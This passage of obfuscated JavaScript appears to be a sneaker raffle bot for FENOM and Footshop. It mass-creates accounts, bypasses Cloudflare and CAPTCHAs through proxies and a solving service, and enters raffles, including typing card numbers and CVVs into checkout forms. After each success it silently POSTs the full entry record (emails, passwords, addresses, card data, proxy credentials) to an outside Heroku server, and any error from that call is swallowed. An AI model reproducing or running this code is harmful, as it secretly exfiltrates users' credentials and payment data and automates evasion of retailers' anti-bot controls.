                            const _0x3b1bc5 = await _0x113a1a['target']()['createCDPSession'](), { windowId: _0x1713d9 } = await _0x3b1bc5['send']('Browser.getWindowForTarget');
                            await _0x113a1a['authenticate']({
                                'username': '' + _0x41e90d[0x2],
                                'password': '' + _0x41e90d[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x113a1a['goto']('' + _0xd03a61, { 'waitUntil': 'networkidle2' }), console['log'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x101cd5(0x1388);
                            var _0x47712a = await _0x113a1a['$']('.hcaptcha-box');
                            if (_0x47712a) {
                                console['log'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x101cd5(0x2710);
                                const _0x93c60f = await _0x113a1a['$']('.hcaptcha-box');
                                if (_0x93c60f)
                                    try {
                                        await _0x93c60f['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x113a1a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x12054e = await _0x113a1a['$']('.hcaptcha-box');
                                    if (_0x12054e)
                                        try {
                                            await _0x12054e['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x113a1a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x3b1bc5['send']('Browser.setWindowBounds', {
                                    'windowId': _0x1713d9,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x101cd5(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x113a1a['type']('input[name=\x22firstname\x22]', '' + _0x2502d5[_0xdaea9]['FirstName']), await _0x101cd5(0x1f4), await _0x113a1a['type']('input[name=\x22lastname\x22]', '' + _0x2502d5[_0xdaea9]['LastName']), await _0x101cd5(0x1f4), await _0x113a1a['type']('input[name=\x22email\x22]', '' + _0x2502d5[_0xdaea9]['Email']), await _0x101cd5(0x1f4), await _0x113a1a['type']('input[name=\x22password\x22]', '' + _0x2502d5[_0xdaea9]['Password']), await _0x101cd5(0x258), await _0x113a1a['$eval']('input[name=\x22psgdpr\x22]', _0xb5534 => _0xb5534['click']()), await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x113a1a['$eval']('#customer-form', _0x545d79 => _0x545d79['submit']());
                            try {
                                try {
                                    await _0x113a1a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x559d90 = 'no', console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Account\x20' + _0x2502d5[_0xdaea9]['Email'] + '\x20Generated')), _0x467c3c['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2502d5[_0xdaea9]['Email'] + ',' + _0x2502d5[_0xdaea9]['Password']);
                                let _0x48dd06 = _0x2502d5[_0xdaea9];
                                try {
                                    prxdata = {
                                        'username': _0x5b6a98['replace']('#', ''),
                                        'module': _0x3f3c7a['name'],
                                        'entrydata': JSON['stringify'](_0x48dd06),
                                        'proxy': '' + _0xcdbbc4[_0xdaea9]
                                    };
                                    var _0x15a29d = JSON['stringify'](prxdata);
                                    let _0x24f1dc = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x15a29d, _0x24f1dc);
                                } catch (_0x2b61c8) {
                                }
                                try {
                                    _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x3ec23e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3b1b09(_0x2caac5, _0x3ec23e['succesDEVMSG']);
                            } catch (_0x18d453) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x3d90ca) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20' + _0x3d90ca)), _0x1c4164 = '' + _0x3d90ca;
                            var _0x18919f = await _0x42c912(_0x2502d5[_0xdaea9], _0x3f3c7a, 'acc', !![], _0x1c4164);
                            _0x3ec23e['errorDEV'] = { 'embeds': [_0x18919f] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x3ec23e['errorDEV']), await _0x3b1b09(_0x57f30c, _0x3ec23e['errorDEV']), _0x559d90 = 'yes';
                        } finally {
                            _0x343683['close']();
                            if (_0x559d90 == 'yes' && _0x56a788 != 0x5 && _0x1c4164 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Task\x20' + (_0xdaea9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x56a788 + '\x20/\x205)')), _0xdaea9 = _0xdaea9 - 0x1, _0x56a788 = _0x56a788 + 0x1;
                                continue;
                            }
                            _0x559d90 == 'yes' && _0x56a788 >= 0x5 && (_0x3802e1(_0x2502d5[_0xdaea9], _0x3f3c7a), _0x559d90 = 'no', _0x56a788 = 0x0), console['log'](_0x235b96() + '\x20[' + _0x3f3c7a['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x2529e0(_0x3b62c4, _0x405f06, _0x5a6ebe) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a5d1e = 0x0; _0x4a5d1e < _0x405f06['length']; _0x4a5d1e++) {
                        if (_0x5d520c != 'yes')
                            var _0x5d520c = '', _0x354529 = 0x0;
                        var _0x569056;
                        try {
                            await _0x15925d(_0x405f06, _0x4a5d1e);
                        } catch {
                            _0x5d520c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x18a4ea(_0x3b62c4['name'] + '\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20/\x20' + _0x405f06['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        const _0x2ea641 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x48f2cf = Math['round'](Math['random']() * (_0x5a6ebe['length'] - 0x1)), _0x2e204b = _0x5a6ebe[_0x48f2cf]['split'](':'), _0x5b5293;
                        try {
                            _0x5b5293 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2e204b[0x0] + ':' + _0x2e204b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5b5293 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2e204b[0x0] + ':' + _0x2e204b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x12c197 = await _0x5b5293['newPage'](), _0xaae839 = await _0x12c197['target']()['createCDPSession'](), { windowId: _0x23caff } = await _0xaae839['send']('Browser.getWindowForTarget');
                            await _0x12c197['authenticate']({
                                'username': '' + _0x2e204b[0x2],
                                'password': '' + _0x2e204b[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x12c197['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x101cd5(0xbb8), await _0xaae839['send']('Browser.setWindowBounds', {
                                'windowId': _0x23caff,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x101cd5(0x1f40);
                            try {
                                await _0x12c197['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x101cd5(0x1388), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Logging\x20in'), await _0x12c197['type']('input[name=\x22email\x22]', '' + _0x405f06[_0x4a5d1e]['Email']), await _0x101cd5(0x1f4), await _0x12c197['type']('input[name=\x22password\x22]', '' + _0x405f06[_0x4a5d1e]['Password']), await _0x101cd5(0x258), await _0x12c197['$eval']('#login-form', _0x35970c => _0x35970c['submit']()), await _0x12c197['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x101cd5(0x1f4), await _0x12c197['goto']('' + _0x405f06[_0x4a5d1e]['Url']), await _0x12c197['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x405f06[_0x4a5d1e]['Size']);
                            if (_0x405f06[_0x4a5d1e]['Size'] != 'RANDOM') {
                                var _0x517888 = '\x20' + _0x405f06[_0x4a5d1e]['Size'] + '\x20';
                                const _0x29be71 = await _0x12c197['$x']('//span[contains(text(),\x20' + _0x517888 + ')]');
                                await _0x29be71[0x0]['click']();
                            } else {
                                const _0x580670 = await _0x12c197['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5837d1 = Math['round'](Math['random']() * (_0x580670['length'] - 0x1));
                                await _0x580670[_0x5837d1]['click']();
                            }
                            await _0x101cd5(0x258), await _0x12c197['click']('#cookieChoiceDismiss'), await _0x101cd5(0x3e8), await _0x12c197['type']('#instagram-account', '' + _0x405f06[_0x4a5d1e]['Follower']), await _0x101cd5(0x28a), await _0x12c197['click']('#book-btn'), await _0x101cd5(0xbb8);
                            try {
                                await _0x12c197['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20' + _0x1ee8dd['cyan']('Solving\x20Captcha')), await _0x12c197['solveRecaptchas'](), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x101cd5(0x7d0), await _0x12c197['$eval']('#book-btn-for-sure', _0x86e516 => _0x86e516['click']()), await _0x101cd5(0x12c), await _0x12c197['click']('#book-btn-for-sure'), await _0x101cd5(0xdac);
                            const _0x371043 = await _0x12c197['$eval']('.reservation-popup\x20>\x20.title', _0x229ef2 => {
                                return _0x229ef2['innerHTML'];
                            });
                            if (_0x371043) {
                                _0x5d520c = 'no', _0x30fd17(_0x405f06[_0x4a5d1e], _0x3b62c4), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x1c6360 = await _0x42c912(_0x405f06[_0x4a5d1e], _0x3b62c4, 'dev', ![]), _0x3041c1 = await _0x42c912(_0x405f06[_0x4a5d1e], _0x3b62c4, 'pub', ![]);
                                let _0xb644a5 = _0x405f06[_0x4a5d1e];
                                try {
                                    prxdata = {
                                        'username': _0x5b6a98['replace']('#', ''),
                                        'module': _0x3b62c4['name'],
                                        'entrydata': JSON['stringify'](_0xb644a5),
                                        'proxy': '' + _0x5a6ebe[_0x4a5d1e]
                                    };
                                    var _0x2d4370 = JSON['stringify'](prxdata);
                                    let _0x4d123e = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x2d4370, _0x4d123e);
                                } catch (_0x185df1) {
                                }
                                const _0x2f35ac = {
                                    'succesDEVMSG': { 'embeds': [_0x1c6360] },
                                    'succesPUBMSG': { 'embeds': [_0x3041c1] }
                                };
                                try {
                                    _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x2f35ac['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x2f35ac['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x2f35ac['succesPUBMSG']);
                                } catch (_0x3dc858) {
                                    console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3dc858));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x1a5b63) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20' + _0x1a5b63)), _0x569056 = '' + _0x1a5b63;
                            var _0x5d83ee = await _0x42c912(_0x405f06[_0x4a5d1e], _0x3b62c4, 'dev', !![], _0x569056), _0x1c6360 = await _0x42c912(_0x405f06[_0x4a5d1e], _0x3b62c4, 'dev', ![]), _0x3041c1 = await _0x42c912(_0x405f06[_0x4a5d1e], _0x3b62c4, 'pub', ![]);
                            const _0x44c5fb = {
                                'succesDEVMSG': { 'embeds': [_0x1c6360] },
                                'succesPUBMSG': { 'embeds': [_0x3041c1] }
                            };
                            _0x44c5fb['errorDEV'] = { 'embeds': [_0x5d83ee] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x44c5fb['errorDEV']), await _0x3b1b09(_0x57f30c, _0x44c5fb['errorDEV']), _0x1a5b63 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5d520c = 'yes');
                        } finally {
                            _0x5b5293['close']();
                            if (_0x5d520c == 'yes' && _0x354529 != 0x5 && _0x569056 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Task\x20' + (_0x4a5d1e + 0x1) + '\x20:\x20Retrying\x20(' + _0x354529 + '\x20/\x205)')), _0x4a5d1e = _0x4a5d1e - 0x1, _0x354529 = _0x354529 + 0x1;
                                continue;
                            }
                            _0x5d520c == 'yes' && _0x354529 >= 0x5 && (_0x3802e1(_0x405f06[_0x4a5d1e], _0x3b62c4), _0x5d520c = 'no', _0x354529 = 0x0), console['log'](_0x235b96() + '\x20[' + _0x3b62c4['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x44ebd1, _0x3cbffb, _0x5423d3) {
                _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5b5c1b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x479ed1 = 0x0; _0x479ed1 < _0x3cbffb['length']; _0x479ed1++) {
                    var _0x34c135;
                    if (_0x5000e2 != 'yes')
                        var _0x5000e2 = '', _0x4a9cd4 = 0x0;
                    var _0x5dac80 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x5b6a98
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x3cbffb[_0x479ed1]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3cbffb[_0x479ed1]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5b5c1b['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x300b57
                            }
                        ]
                    }], _0x3bb0e7 = await _0x42c912(_0x3cbffb[_0x479ed1], _0x44ebd1, 'dev', ![]), _0x428b48 = await _0x42c912(_0x3cbffb[_0x479ed1], _0x44ebd1, 'pub', ![]);
                    const _0x30e6c8 = {
                        'succesDEVMSG': { 'embeds': [_0x3bb0e7] },
                        'succesPUBMSG': { 'embeds': [_0x428b48] }
                    }, _0x3418e4 = { 'embeds': _0x5dac80 };
                    try {
                        await _0x15925d(_0x3cbffb, _0x479ed1);
                    } catch {
                        _0x5000e2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x3cbffb[_0x479ed1]['Email'] == '' || _0x3cbffb[_0x479ed1]['FirstName'] == '' || _0x3cbffb[_0x479ed1]['LastName'] == '' || _0x3cbffb[_0x479ed1]['Country'] == '' || _0x3cbffb[_0x479ed1]['Size'] == '' || _0x3cbffb[_0x479ed1]['Address1'] == '' || _0x3cbffb[_0x479ed1]['Zip'] == '') {
                        console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x3cbffb[_0x479ed1]['Email'] == '' || _0x3cbffb[_0x479ed1]['FirstName'] == '' || _0x3cbffb[_0x479ed1]['LastName'] == '' || _0x3cbffb[_0x479ed1]['Country'] == '' || _0x3cbffb[_0x479ed1]['Size'] == '' || _0x3cbffb[_0x479ed1]['Address1'] == '' || _0x3cbffb[_0x479ed1]['Zip'] == '' || _0x3cbffb[_0x479ed1]['Phone'] == '') {
                        console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x5aa72c = '' + _0x3cbffb[_0x479ed1]['Url'];
                    if (_0x5b5c1b['useRandomProxy'] = ![])
                        var _0x22085d = _0x5423d3[_0x479ed1]['split'](':');
                    else
                        var _0x19a26d = Math['round'](Math['random']() * (_0x5423d3['length'] - 0x1)), _0x22085d = _0x5423d3[_0x19a26d]['split'](':');
                    var _0x14430e;
                    try {
                        _0x14430e = await _0x23c50c['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x22085d[0x0] + ':' + _0x22085d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x14430e = await _0x23c50c['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x22085d[0x0] + ':' + _0x22085d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1d124b = await _0x14430e['newPage']();
                        await _0x1d124b['authenticate']({
                            'username': '' + _0x22085d[0x2],
                            'password': '' + _0x22085d[0x3]
                        }), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d124b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1d124b['setRequestInterception'](!![]), _0x1d124b['on']('request', _0x51e47a => {
                            _0x51e47a['resourceType']() === 'image' || _0x51e47a['resourceType']() === 'font' || _0x51e47a['resourceType']() === 'media' ? _0x51e47a['abort']() : _0x51e47a['continue']();
                        });
                        try {
                            await _0x1d124b['goto'](_0x5aa72c), await _0x101cd5(0xbb8), await _0x1d124b['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x1d124b['click']('.control__JhutY'), await _0x101cd5(0x1f4);
                        if (_0x3cbffb[_0x479ed1]['Size'] != 'RANDOM')
                            try {
                                const _0x2e4478 = await _0x1d124b['$x']('//div[contains(text(),\x20\x27' + _0x3cbffb[_0x479ed1]['Size'] + '\x27)]');
                                await _0x2e4478[0x0]['click']();
                            } catch {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x3cfa09 = await _0x1d124b['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x26fa80 = Math['round'](Math['random']() * (_0x3cfa09['length'] - 0x1));
                            await _0x3cfa09[_0x26fa80]['click']();
                        }
                        await _0x101cd5(0x4b0);
                        const _0x4112e3 = await _0x1d124b['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x4112e3[0x0]['click'](), await _0x1d124b['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x1d124b['type']('input[name=\x22email\x22]', '' + _0x3cbffb[_0x479ed1]['Email']), await _0x101cd5(0x640), await _0x1d124b['type']('input[name=\x22phone\x22]', '' + _0x3cbffb[_0x479ed1]['Phone']), await _0x101cd5(0x4b0), await _0x1d124b['click']('button.btn.continue-button__1RtsS'), await _0x101cd5(0x4b0);
                        try {
                            await _0x1d124b['type']('input[name=\x22firstName\x22]', '' + _0x3cbffb[_0x479ed1]['FirstName']), await _0x101cd5(0x258);
                        } catch {
                            const _0x3e4046 = await _0x1d124b['$$eval']('.invalid-feedback\x20>\x20div', _0x48630f => {
                                return _0x48630f['map'](_0x406f63 => _0x406f63['innerText']);
                            });
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20' + _0x3e4046));
                            continue;
                        }
                        await _0x1d124b['type']('input[name=\x22lastName\x22]', '' + _0x3cbffb[_0x479ed1]['LastName']), await _0x101cd5(0xc8), await _0x1d124b['type']('input[name=\x22instagramUsername\x22]', '' + _0x3cbffb[_0x479ed1]['Follower']), await _0x101cd5(0x4b0), await _0x1d124b['click']('button.btn.continue-button__1RtsS'), await _0x101cd5(0x3e8), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x1d124b['select']('select[name=\x22country\x22]', '' + _0x3cbffb[_0x479ed1]['Country']), await _0x101cd5(0x2bc), await _0x1d124b['type']('input[name=\x22streetName\x22]', '' + _0x3cbffb[_0x479ed1]['Address1']), await _0x101cd5(0x258), await _0x1d124b['type']('input[name=\x22houseNumber\x22]', _0x3cbffb[_0x479ed1]['HouseNumber'] + '\x20' + _0x3cbffb[_0x479ed1]['Address2']), await _0x101cd5(0xc8), await _0x1d124b['type']('input[name=\x22postalCode\x22]', '' + _0x3cbffb[_0x479ed1]['Zip']), await _0x101cd5(0x1f4), await _0x1d124b['type']('input[name=\x22city\x22]', '' + _0x3cbffb[_0x479ed1]['City']), await _0x101cd5(0x4b0), await _0x1d124b['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x101cd5(0x4b0), await _0x1d124b['click']('button.btn.continue-button__1RtsS'), await _0x101cd5(0x4b0), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x1d124b['solveRecaptchas'](), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x101cd5(0xbb8), await _0x1d124b['click']('button.btn.continue-button__1RtsS'), await _0x101cd5(0x1388), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1d124b['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d124b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x101cd5(0x4b0), await _0x1d124b['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3cbffb[_0x479ed1]['CardNumber']), await _0x101cd5(0x320), await _0x1d124b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1d124b['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3cbffb[_0x479ed1]['ExpiryDate']), await _0x101cd5(0x4b0), await _0x1d124b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1d124b['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3cbffb[_0x479ed1]['CVV']), await _0x101cd5(0x226), await _0x1d124b['type']('input[name=\x22holderName\x22]', '' + _0x3cbffb[_0x479ed1]['NameOnCard']), await _0x101cd5(0x226), await _0x1d124b['click']('button.adyen-checkout__button'), console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x1d124b['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x101cd5(0xbb8);
                        } catch (_0x3e7bd4) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x203DS\x20Failed')), _0x34c135 = '3DS\x20Error\x20' + _0x3e7bd4;
                            var _0x3e8875 = await _0x42c912(_0x3cbffb[_0x479ed1], _0x44ebd1, 'dev', !![], _0x34c135);
                            _0x30e6c8['errorDEV'] = { 'embeds': [_0x3e8875] };
                            _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x30e6c8['errorDEV']);
                            await _0x3b1b09(_0x57f30c, _0x30e6c8['errorDEV']);
                            continue;
                        }
                        _0x30fd17(_0x3cbffb[_0x479ed1], _0x44ebd1), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x28a15d = _0x3cbffb[_0x479ed1];
                        try {
                            prxdata = {
                                'username': _0x5b6a98['replace']('#', ''),
                                'module': _0x44ebd1['name'],
                                'entrydata': JSON['stringify'](_0x28a15d),
                                'proxy': '' + _0x5423d3[_0x479ed1]
                            };
                            var _0x99e6a5 = JSON['stringify'](prxdata);
                            let _0x28aaa9 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x99e6a5, _0x28aaa9);
                        } catch (_0x4085eb) {
                        }
                        if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                            try {
                                await _0x3b1b09(_0x5b5c1b['webhook'], _0x30e6c8['succesDEVMSG']);
                            } catch {
                            }
                        await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x30e6c8['succesDEVMSG']), await _0x101cd5(0xc8);
                        try {
                            await _0x3b1b09(_0x155517, _0x30e6c8['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x49f20d) {
                        console['log'](_0x235b96() + '\x20[' + _0x44ebd1['name'] + ']\x20Task\x20' + (_0x479ed1 + 0x1) + '\x20:\x20' + _0x49f20d), _0x34c135 = '' + _0x49f20d;
                        var _0x3e8875 = await _0x42c912(_0x3cbffb[_0x479ed1], _0x44ebd1, 'dev', !![], _0x34c135);
